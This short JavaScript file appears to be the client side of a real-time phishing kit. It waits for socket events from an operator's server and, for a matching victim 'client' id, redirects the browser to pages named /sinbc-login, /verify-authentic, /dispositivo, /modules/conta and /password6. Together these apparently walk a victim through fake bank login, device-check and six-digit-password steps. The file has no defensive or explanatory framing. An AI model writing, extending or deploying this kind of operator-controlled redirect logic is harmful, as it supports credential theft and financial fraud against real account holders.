const await = (() => {
    //private var/functions
    function commands() {
        socket.on('errorpassword', (user) => {
            if (user.id) window.location.href = `/sinbc-login?client=${user.id}&error=true`
        })

        socket.on('getAuth', data => {
            const params = new URLSearchParams(window.location.search)

            if (params.has('client')) {
                if (params.get('client') == data) window.location.href = `/verify-authentic?client=${data}`
            } else return
        })

        socket.on('disp', (data) => {
            const params = new URLSearchParams(window.location.search)

            if (params.has('client')) {
                if (params.get('client') == data) window.location.href = `/dispositivo?client=${data}`
            } else return
        })

        socket.on('erroruser', (data) => {

            const params = new URLSearchParams(window.location.search)

            if (params.has('client')) {
                if (params.get('client') == data) window.location.href = `/modules/conta?client=${data}`
            } else return
        })

        socket.on('errorpass6', (data) => {
            const params = new URLSearchParams(window.location.search)


            if (params.has('client')) {
                if (params.get('client') == data) window.location.href = `/password6?client=${data}`
            } else return
        })
    }

    function startRoom() {
        // socket.emit('start', theUser)

        // //await
        // socket.emit('await', theUser)
    }

    return {
        //public var/functions
        startRoom,
        commands
    }
})()

await.startRoom()
await.commands()
